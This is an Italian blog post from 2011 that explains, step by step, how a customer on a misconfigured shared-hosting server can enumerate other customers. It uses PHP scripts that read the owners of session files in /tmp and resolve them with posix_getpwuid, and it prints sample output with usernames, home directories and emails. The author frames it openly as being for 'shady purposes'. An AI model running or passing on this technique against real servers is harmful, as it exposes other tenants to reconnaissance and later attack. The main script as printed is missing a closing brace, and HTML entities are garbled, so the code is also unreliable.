Date: 2011-01-26 15:46:20
Author: evilsocket
Categories: Exploiting, Hacking, Papers, Web Hacking
Tags: bypass, enumeration, fileowner, getcwd, glob, opendir, owner, permission denied, PHP, posix_getpwuid, readdir, security
Title: PHP Users Enumeration Security Bypass

Ed eccoci in un altro articolo che, come il <a href="http://www.evilsocket.net/2061/php-local-session-manipulation-e-configurazione-sbagliata-dei-permessi.html" target="_blank">precedente</a>, descrive un ulteriore problematica dovuta ad una cattiva configurazione di un server di shared hosting ^^.

Abbiamo parlato della /tmp, dei file di sessione e di come manipolarli per i nostri (loschi) scopi, ora vedremo come superare dei permessi restrittivi che non ci consentono di elencare le home directory (quindi le cartelle htdocs) degli altri utenti sul nostro server.

Prima di tutto, sul nostro sito eseguiamo lo script che segue per determinare in che cartella ci troviamo:
<pre>

<div class="codecolorer-container text default" style="overflow:auto;white-space:nowrap;width:100%;height:100%;"><div class="text codecolorer">&nbsp; &nbsp; &amp;lt;?php<br />
&nbsp; &nbsp; &nbsp; die(getcwd());<br />
&nbsp; &nbsp; ?&amp;gt;</div></div>

</pre>

<break>

Il che ci restituirà una stringa del tipo '/home/www/nostrosito.com' ... proviamo ora ad enumerare gli altri siti/utenti nella cartella /home/www come si farebbe normalmente in PHP:

<pre>

<div class="codecolorer-container text default" style="overflow:auto;white-space:nowrap;width:100%;height:100%;"><div class="text codecolorer">&amp;lt;?php<br />
&nbsp; &nbsp; if ($handle = opendir('/home/www/')) {<br />
&nbsp; &nbsp; &nbsp; &nbsp; while (false !== ($file = readdir($handle))) {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($file != &quot;.&quot; &amp;amp;&amp;amp; $file != &quot;..&quot;) {<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo &quot;$file\n&quot;;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; closedir($handle);<br />
&nbsp; &nbsp; }<br />
?&amp;gt;</div></div>

</pre>

Ed indovinate un po? Ci troveremo davanti l'errore:

<pre>

<div class="codecolorer-container text default" style="overflow:auto;white-space:nowrap;width:100%;"><div class="text codecolorer">Warning: opendir(/home/www/) [function.opendir]: failed to open dir: Permission denied in /home/www/nostrosito.com/prova.php on line 5</div></div>

</pre>

Uuuuuu che cattivoni! A noi quel Permission denied non piace per niente vero? :P

Bene! Sfruttiamo la /tmp ed i file di sessione nel seguente modo:
<ul>
	<li>Elenchiamo tutti i file di sessione (volendo proprio tutti per esser sicuri) nella /tmp</li>
	<li>Per ognuno, prendiamo l'uid dell'owner, quindi dell'utente al quale appartiene, tramite la funzione PHP <a href="http://php.net/manual/en/function.fileowner.php" target="_blank">fileowner</a></li>
	<li>Avendo l'uid, tiriamo fuori il nostro kung-fu e prendiamoci le altre informazioni (gid, home path, ecc) tramite la funzione <a href="http://www.php.net/manual/en/function.posix-getpwuid.php" target="_blank">posix_getpwuid</a> :D</li>
	<li>Il gioco è fatto</li>
</ul>
Lo script è il seguente:
<pre>

<div class="codecolorer-container text default" style="overflow:auto;white-space:nowrap;width:100%;height:100%;"><div class="text codecolorer">&nbsp; &amp;lt;?php<br />
&nbsp; &nbsp; $files = glob( &quot;/tmp/sess_*&quot; );<br />
&nbsp; &nbsp; $users = array();<br />
&nbsp; &nbsp; foreach( $files as $file ){<br />
&nbsp; &nbsp; &nbsp; $owner = fileowner($file);<br />
&nbsp; &nbsp; &nbsp; $user  = posix_getpwuid($owner);<br />
&nbsp; &nbsp; &nbsp; if( !in_array( $user, $users ) ){<br />
&nbsp; &nbsp; &nbsp; &nbsp; $users[] = $user;<br />
&nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; <br />
&nbsp; &nbsp; foreach( $users as $user ){<br />
&nbsp; &nbsp; &nbsp; $info = str_replace( ' ', '&amp;amp;nbsp;', print_r($user,true) );<br />
&nbsp; &nbsp; &nbsp; echo nl2br($info);<br />
&nbsp; &nbsp; }<br />
?&amp;gt;</div></div>

</pre>

Ed avremo la nostra bella lista, del tipo:
<pre>

<div class="codecolorer-container text default" style="overflow:auto;white-space:nowrap;width:100%;height:100%;"><div class="text codecolorer">&nbsp; Array<br />
&nbsp; (<br />
&nbsp; &nbsp; [name] =&amp;gt; pierino.it<br />
&nbsp; &nbsp; [passwd] =&amp;gt; *<br />
&nbsp; &nbsp; [uid] =&amp;gt; 52417<br />
&nbsp; &nbsp; [gid] =&amp;gt; 52417<br />
&nbsp; &nbsp; [gecos] =&amp;gt; pierino.it@pierino.it<br />
&nbsp; &nbsp; &lt;strong&gt; [dir] =&amp;gt; /home/www/pierino.it &lt;/strong&gt;<br />
&nbsp; &nbsp; [shell] =&amp;gt; /bin/true<br />
&nbsp; )<br />
<br />
&nbsp; Array<br />
&nbsp; (<br />
&nbsp; &nbsp; [name] =&amp;gt; foobar.com<br />
&nbsp; &nbsp; [passwd] =&amp;gt; *<br />
&nbsp; &nbsp; [uid] =&amp;gt; 61240<br />
&nbsp; &nbsp; [gid] =&amp;gt; 61240<br />
&nbsp; &nbsp; [gecos] =&amp;gt; foobar.com@foobar.com<br />
&nbsp; &nbsp; &lt;strong&gt; [dir] =&amp;gt; /home/www/foobar.com &lt;/strong&gt;<br />
&nbsp; &nbsp; [shell] =&amp;gt; /bin/true<br />
&nbsp; )<br />
<br />
&nbsp; ...</div></div>

</pre>

Bingoooo, ecco la lista degli utenti apache e delle rispettive home directory / htdocs (cazzio pure le email :D) ... come si diceva?
<br>
<p style="text-align: center;"><strong>My Kung Fu Is Stronger Than Yours!!!!!</strong></p>
